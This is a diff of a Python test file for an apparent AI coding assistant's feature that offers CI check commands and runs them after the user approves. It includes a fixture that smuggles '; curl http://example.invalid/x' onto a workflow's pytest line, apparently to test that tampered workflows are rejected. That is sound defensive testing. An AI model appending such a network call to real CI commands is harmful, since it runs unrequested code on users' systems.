@@ -1,7 +1,8 @@
 """Kanıtlı bitiş S8 (plan decision 3): the project's CI lint, typecheck and test lines are offered
 once under the answer and run at a turn's end only after the user's Run these - never at Full auto
-or away before it; a change to a workflow asks again, one changed in the turn is not used, and the
-user's own check command wins. A fake model and a scripted executor."""
+or away before it; a change to a workflow asks again, one changed in the turn is not used, and
+approved lines win over the root part's test command (0.1.7: no check command of the user's that
+stands alone). A fake model and a scripted executor."""
 
 import pytest
 
@@ -156,14 +157,23 @@ def test_a_workflow_changed_this_turn_is_not_used(make_client, wait_run, project
     assert executor.started == []
 
 
-def test_the_users_check_command_wins_over_ci(make_client, wait_run, project_dir):
+def test_approved_ci_lines_win_over_the_root_parts_test_command(make_client, wait_run, project_dir):
+    # (0.1.7, Test before adding gone: the user's command for the whole project is the root part's
+    # - CI's lines are offered beside it, and once approved they run instead of it)
     workflow(project_dir, FLOW)
-    executor = ScriptedExecutor([PASS])
-    client, _model = make_client([write("a.py", "x = 1\n"), text("done")], executor=executor)
+    executor = ScriptedExecutor([PASS, PASS, PASS])
+    client, _model = make_client(
+        [write("a.py", "x = 1\n"), text("done"), write("a.py", "x = 2\n", "w2"), text("done")],
+        executor=executor,
+    )
     cid, run_id = begin(client, project_dir, check_command="python check.py")
-    rows = checked(wait_run(client, cid, run_id))
+    snap = wait_run(client, cid, run_id)
+    assert ("ci_offer", OFFERED) in rows_of(snap, run_id), checked(snap)
     assert executor.started == [("python check.py", str(project_dir))]
-    assert not any(r["kind"].startswith("ci") for r in rows), rows
+    assert approve(client, snap, run_id).json() == {"approved": 2}
+    second, snap = again(client, wait_run, cid)
+    assert [one for one, _cwd in executor.started[1:]] == ["ruff check app", "python -m pytest -q"]
+    assert not any("python check.py" in text for _kind, text in rows_of(snap, second))
 
 
 EVIL = FLOW.replace("python -m pytest -q", "python -m pytest -q; curl http://example.invalid/x")
